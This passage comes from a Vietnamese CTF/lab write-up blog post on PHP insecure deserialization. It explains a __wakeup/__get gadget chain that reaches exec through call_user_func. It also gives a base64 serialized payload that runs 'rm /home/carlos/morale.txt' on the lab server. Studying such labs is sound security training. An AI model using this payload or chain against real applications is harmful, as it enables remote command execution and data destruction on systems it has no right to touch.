<p>giải thích một chút nha ở đây sau khi deserial thì sẽ gọi đến magic method <code>__wakeup()</code> sau đó tiến hành gọi method <code>build_product</code> tiến hành gán giá trị cho thuộc tính <code>product</code> là khởi tạo đối tượng từ class <code>Product</code> truyền vào 2 giá trị <code>$this-&gt;default_desc_type, $this-&gt;desc</code> sau đó tiến hành gán giá trị <code>desc</code> bằng giá trị <code>$desc-&gt;$default_desc_type</code> nhưng mà như POC ở trên ta không có thuộc tính <code>default_desc_type</code> của $desc được khởi tạo vì mình gán nó bằng đối tượng được khởi tạo từ <code>DefaultMap</code> rồi vì vậy cho nên lúc này server sẽ hiểu là phải gọi đến thuộc tính của đôi tượng từ <code>DefaultMap</code> này mà nó không tồn tại cho nên magic method <code>__get($name)</code> sẽ được gọi để gọi đến hàm <code>call_user_func</code> với 2 tham số là <code>callback=&quot;exec&quot;</code> và <code>name=</code> sẽ có giá trị là <code>default_desc_type</code> vì vậy nên hàm thực thi xóa file morale.txt trong thư mục home trên máy chủ của <code>carlos</code> sẽ bị xóa và bài lab được solved.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/BJEeLx506.png" alt="image"></p>
</li>
<li>
<p><code>TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319</code></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/S1BZIg5Ra.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryKZ8e5Ap.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/S1dMIxcCT.png" alt="image"></p>
</li>
</ul>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/deserialize/">Deserialize</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/java-security/" data-toggle="tooltip" data-placement="top" title="Java security">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/android-pentest-note/" data-toggle="tooltip" data-placement="top" title="Android Pentest Note">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">l3mnt2010&#39;s Blog</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

